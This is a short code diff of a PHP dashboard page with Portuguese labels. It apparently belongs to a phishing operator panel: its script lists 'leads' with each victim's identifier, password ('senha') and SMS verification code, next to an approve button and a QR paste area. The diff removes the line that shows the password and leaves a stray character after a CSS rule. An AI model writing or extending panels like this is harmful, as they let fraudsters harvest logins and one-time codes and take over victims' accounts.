@@ -53,7 +53,7 @@ session_start();
         .btn-approve
         
         .qr-upload-area { grid-column: 1 / -1; margin-top: 10px; border-top: 1px solid var(--border-color); padding-top: 20px; }
-        .qr-upload-area p { font-weight: 600; display: block; margin: 0 0 10px 0; }
+        .qr-upload-area p { font-weight: 600; display: block; margin: 0 0 10px 0; }c
         .paste-area { border: 2px dashed var(--text-secondary); border-radius: 6px; padding: 20px; text-align: center; color: var(--text-secondary); cursor: pointer; transition: all 0.2s; }
         .paste-area:hover { border-color: var(--accent-primary); color: var(--accent-primary); }
     </style>
@@ -214,7 +214,6 @@ session_start();
                     card.querySelector('.lead-id').textContent = lead.id;
                     card.querySelector('.lead-date').textContent = new Date(lead.data_criacao).toLocaleString('pt-BR');
                     card.querySelector('.lead-identifier').textContent = lead.identificador;
-                    card.querySelector('.lead-password').textContent = lead.senha || 'Aguardando...';
                     card.querySelector('.lead-sms').textContent = lead.sms_code || 'Aguardando...';
                     
                     // LÓGICA DE CORES PARA O STATUS
